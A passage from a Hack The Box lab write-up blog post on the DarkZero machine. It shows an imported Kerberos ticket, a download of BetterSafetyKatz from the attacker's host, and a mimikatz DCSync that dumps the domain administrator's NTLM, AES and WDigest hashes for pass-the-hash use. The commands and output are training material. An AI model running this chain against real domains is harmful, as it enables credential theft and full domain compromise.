/ticket:doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZA4tGXPOXC/hNMYPqm4sD31BOfwroajVPeX/BgTeLv6uLfDUi9HAdDZxuesT6Mf/jQ6vyhHzmLbFxav897YkwKq+8poI85YwybQ3Pbe8m3D7Ss9BPTDBxUnHSqy9n6jOZ62R+3TSRUO/WgF5Dpxc99EtUKWmjGbFvQwuzH6fn/jRuEltyW69SNwtMw2IYKRnGTbHnoSkuoDsEfPwsu9e6oMub6QeRD0bjlSZLr5xkR9POEylt6JfS/RhnzvxpoM16geKZDTKxhSOWWN2o0uAtdDcLVhOtVTs00rVEStCw/FAA1dpgsUB6QfMHqBq+I3NLp0T4yUR+idY99bAOgdBi8ZPpb2bLd1eSmzR6nJmrESDZo4LWp5+amVsnqKiAz2cupzaHpq8sDiiMQhoRgKrviShXV0TGyKWmk6h71Ft9Mm9kDuIO0a67ggPVCnayAAuWaEKx8FCkImKQvZN9cg8J8nNhaeIXiEP8eZSQL2qvlrlQx7N7yRpzSLCJ4e4tzlTDkpoOsRLUjktTObj+moph9NXsIRgwQMOdYfuwfxIlYX6Ky0Rqz5KH3TKt7h6tjTaawavQAMmPCQXeCgfPqFxE6j4j8SqZekLz5pd/Iii0rHsLFHaeP6OBD0Y4e0v8WLP9Eum9TFvEZyRRUlDjL7ZqbEZ2IitPfkmetJK6qcMDbFthtLpQf9wOvZTYlzYpHoBSbQnTLfWQqCq8oiK5jUf5jk9GVSbILhz3L/1zDVtqJ+ps8FGGnMk/+cUeiK3lVRs8EFRBz5OQ6vAAjzUbHUNyO/6ifsTTOxNH489mtns9ma3h7QIe+WGt+VtSMLyRcBALwcFLDGWCfoHzwH/9YxMKNUGdxTuRQcQ7BTr7JDzmfXLtF7S9XPccdF12Ed+2IYNnPAck6HZqodQP7faewNVQEO/9wpd5vr+7CREGZbq8sy5YBAbD5vmkYxhftc8lGspizc0NQVrW5zdHUSXK2IvGTWGI8L1V+HQLjA4zWax7/NwZuqbgcnuPwAw3XWU4fr8SaHZ+x88wXY/6X3XCueWxpjbrGMkiRloobrdRd0eL9UX8N2FnYEf8A7jsS4xndKY3IliOwU+OL31XQGxFKUfUHz0a2pgAbWaDQlnd4meFd7MyV++u7r/eduKR3xQFNbh/dWcg3LsZioxyPiP8yx2heuLnOQ92QBStUBeYS3euBUe3bFuWbWieAypclnWjvJoXFEBcKBANuhYi+BwC7jaht4Osk5Oj0iv7wOgRnxlpQVCwzH+CrojIsI8SeGOKqRrkx7jRUZKEa6Vaw2lHKbJBQ9SsQHaeRdtAO11rtw42hk9wHGxK9LC1cs3vQgsrLMUyQ3xd97WGU6bSesCdA8uvPDIBbJOR9D9LOcUO5SbcY0YwUv1Z8BPmO3MtU49Kt61ei/xiGKEIrHKQQ+pYz99GH75/Njp6jo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQg1iBIi6N0M++dx9EWONluC28TRnReb5hY8MqfjA1zsYahDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDgxMzMxMDBaphEYDzIwMjUxMDA4MjMzMTAwWqcRGA8yMDI1MTAxNTEzMzEwMFqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Import Ticket</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line">PS C:\users\administrator\desktop&gt; klist</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line">Current LogonId is 0:0x3e7</span><br><span class="line"></span><br><span class="line">Cached Tickets: (1)</span><br><span class="line"></span><br><span class="line">#0&gt;     Client: DC01$ @ DARKZERO.HTB</span><br><span class="line">        Server: krbtgt/DARKZERO.HTB @ DARKZERO.HTB</span><br><span class="line">        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96</span><br><span class="line">        Ticket Flags 0x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize</span><br><span class="line">        Start Time: 10/8/2025 6:31:00 (local)</span><br><span class="line">        End Time:   10/8/2025 16:31:00 (local)</span><br><span class="line">        Renew Time: 10/15/2025 6:31:00 (local)</span><br><span class="line">        Session Key Type: AES-256-CTS-HMAC-SHA1-96</span><br><span class="line">        Cache Flags: 0x1 -&gt; PRIMARY</span><br><span class="line">        Kdc Called:</span><br></pre></td></tr></table></figure></div>
+
+<p>We now have DC01’s machine account TGT imported into our session.</p>
+<h2 id="DCSync-Domain-Administrator"><a href="#DCSync-Domain-Administrator" class="headerlink" title="DCSync - Domain Administrator"></a>DCSync - Domain Administrator</h2><p>With DC01’s TGT, we can now perform a DCSync attack against <code>darkzero.htb</code> to extract the domain administrator’s NTLM hash. We upload BetterSafetyKatz and run mimikatz’s <code>lsadump::dcsync</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS C:\users\administrator\desktop&gt; iwr 10.10.16.6/BetterSafetyKatz.exe -outfile BetterSafetyKatz.exe</span><br><span class="line">iwr 10.10.16.6/BetterSafetyKatz.exe -outfile BetterSafetyKatz.exe</span><br><span class="line">PS C:\users\administrator\desktop&gt; ./BetterSafetyKatz.exe &quot;lsadump::dcsync /user:darkzero\administrator&quot; &quot;exit&quot;</span><br><span class="line">./BetterSafetyKatz.exe &quot;lsadump::dcsync /user:darkzero\administrator&quot; &quot;exit&quot;</span><br><span class="line">[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9</span><br><span class="line">[+] Randomizing strings in memory</span><br><span class="line">[+] Suicide burn before CreateThread!</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /user:darkzero\administrator</span><br><span class="line">[DC] &#x27;darkzero.ext&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC02.darkzero.ext&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;darkzero\administrator&#x27; will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br></pre></td></tr></table></figure></div>
+
+<p>The first attempt targets the wrong domain <code>darkzero.ext</code> since we’re running from DC02. We specify the <code>/domain:darkzero.htb</code> flag to target the parent domain:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">PS C:\users\administrator\desktop&gt; ./BetterSafetyKatz.exe &quot;lsadump::dcsync /user:darkzero\administrator /domain:darkzero.htb&quot; &quot;exit&quot;</span><br><span class="line">./BetterSafetyKatz.exe &quot;lsadump::dcsync /user:darkzero\administrator /domain:darkzero.htb&quot; &quot;exit&quot;</span><br><span class="line">[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9</span><br><span class="line">[+] Randomizing strings in memory</span><br><span class="line">[+] Suicide burn before CreateThread!</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /user:darkzero\administrator /domain:darkzero.htb</span><br><span class="line">[DC] &#x27;darkzero.htb&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.darkzero.htb&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;darkzero\administrator&#x27; will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Administrator</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 9/10/2025 9:42:44 AM</span><br><span class="line">Object Security ID   : S-1-5-21-1152179935-589108180-1989892463-500</span><br><span class="line">Object Relative ID   : 500</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 5917507bdf2ef2c2b0a869a1cba40726</span><br><span class="line">    ntlm- 0: 5917507bdf2ef2c2b0a869a1cba40726</span><br><span class="line">    ntlm- 1: 5917507bdf2ef2c2b0a869a1cba40726</span><br><span class="line">    lm  - 0: 58ef66870a9927dd48b3bd9d7e03845f</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : eb8f12be2ec1b48c9b9ed472823e4e60</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : DARKZERO.HTBAdministrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5_nt    (4096) : 2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd</span><br><span class="line">      unknow            (4096) : a23315d970fe9d556be03ab611730673</span><br><span class="line">      aes256_hmac       (4096) : d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd</span><br><span class="line">      aes128_hmac       (4096) : b1e04b87abab7be2c600fc652ac84362</span><br><span class="line">      rc4_hmac_nt       (4096) : 5917507bdf2ef2c2b0a869a1cba40726</span><br><span class="line">    ServiceCredentials</span><br><span class="line">      des_cbc_md5_nt    (4096) : 2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd</span><br><span class="line">      unknow            (4096) : a23315d970fe9d556be03ab611730673</span><br><span class="line">      aes256_hmac       (4096) : d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd</span><br><span class="line">      aes128_hmac       (4096) : b1e04b87abab7be2c600fc652ac84362</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5_nt    (4096) : 298bc77657a3737b452bb09be407d46b795774e5c3bbfcc68e8f0a4015b59459</span><br><span class="line">      unknow            (4096) : d1d84cca796daa8d9dda56c9fbd29110</span><br><span class="line">      aes256_hmac       (4096) : fe0ba028010ee4f408ebc846d3f480c1880a4f0274acdb226d3afcdc3595dc21</span><br><span class="line">      aes128_hmac       (4096) : a2a7e0e9a4b5ade57242b3e97756dca3</span><br><span class="line">      rc4_hmac_nt       (4096) : 5917507bdf2ef2c2b0a869a1cba40726</span><br><span class="line">    OlderCredentials</span><br><span class="line">      des_cbc_md5_nt    (4096) : d828032ab803aa2d52a9db423de22fe27af55a9fd2101037b106e856ef515216</span><br><span class="line">      unknow            (4096) : 5f9f4fbb6a67b92e5ec7b34c3ba9d322</span><br><span class="line">      aes256_hmac       (4096) : ead37d7deb508c2ad7fd748960cb115d0857b23d95a69cfc95fa693d9d2ca987</span><br><span class="line">      aes128_hmac       (4096) : d027d6dfa67d37190ea37579b948874a</span><br><span class="line">      rc4_hmac_nt       (4096) : cf3a5525ee9414229e66279623ed5c58</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    01  059775b62c039e3def2ae0dd3cf5fdeb</span><br><span class="line">    02  cd2cdff8fba2798b8f5736af3b0617e2</span><br><span class="line">    03  f807da3ed4e91404a7b9e87915b92114</span><br><span class="line">    04  059775b62c039e3def2ae0dd3cf5fdeb</span><br><span class="line">    05  3209c6585c69e581da8b23ad280d48aa</span><br><span class="line">    06  c75dced3815eff7f99a6ef67018be23e</span><br><span class="line">    07  0fca3845bf99227b23ac897eb7e7246d</span><br><span class="line">    08  7d1a78d4cc10d91caf276f70790866c2</span><br><span class="line">    09  cec6c4e88dbb2e0b2cf3c87ff44cd372</span><br><span class="line">    10  81ee716a17e92b26d65b932c55ceaa54</span><br><span class="line">    11  5a808b7dd291f85e64e53439a7520d42</span><br><span class="line">    12  7d1a78d4cc10d91caf276f70790866c2</span><br><span class="line">    13  c421d8af0cfd4330cf4312d05e135127</span><br><span class="line">    14  47b49319d1bb83cc2f6fc2767acb9dc6</span><br><span class="line">    15  13ad2c29ee304491557ebfef55693708</span><br><span class="line">    16  7f8a2135bf0aac335296f86f84660fb0</span><br><span class="line">    17  fa7267a1c55c45633b83a34d05f0056f</span><br><span class="line">    18  b8f360edd930f882d000d03bc07d0973</span><br><span class="line">    19  8ed43db2829682a63b52f73037ea654b</span><br><span class="line">    20  276189d18309b00e3e36f4fc3b936677</span><br><span class="line">    21  1726c96c2c2998836f09fe572eada8d9</span><br><span class="line">    22  bdbd5d774b16233eab9c00804b12601a</span><br><span class="line">    23  9131f6686281d29fc473b940d1a1c022</span><br><span class="line">    24  2e1e69803702ba4e530debd3b5d5ee74</span><br><span class="line">    25  1b79e43d6f356574fdab541ec4ebe0b8</span><br><span class="line">    26  e64552e3066c37621f8a7132b64b3a15</span><br><span class="line">    27  bd8a3360652182c95cbc4c54553f330f</span><br><span class="line">    28  9e10974f986144193c8499681c658880</span><br><span class="line">    29  61c17ed3d006e5d2d56c2b2f86e0bdd2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br><span class="line">PS C:\users\administrator\desktop&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We successfully extracted the domain administrator’s NTLM hash: <code>5917507bdf2ef2c2b0a869a1cba40726</code>. From here we can pass the hash to authenticate to DC01 and claim the root flag.</p>
+<p>That was it for DarkZero, hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: DarkZero</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-04-07 23:27:08</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-04-07 23:41:42
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/04/07/Hackthebox-DarkZero/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/03/30/Hackthebox-Browsed/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Browsed</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: DarkZero</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSQL-Linked-Servers"><span class="nav-text">MSSQL - Linked Servers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Foothold-Reverse-Shell-via-MSSQL-Link"><span class="nav-text">Foothold - Reverse Shell via MSSQL Link</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-CVE-2024-30088"><span class="nav-text">Privilege Escalation - CVE-2024-30088</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lateral-Movement-Unconstrained-Delegation"><span class="nav-text">Lateral Movement - Unconstrained Delegation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DCSync-Domain-Administrator"><span class="nav-text">DCSync - Domain Administrator</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
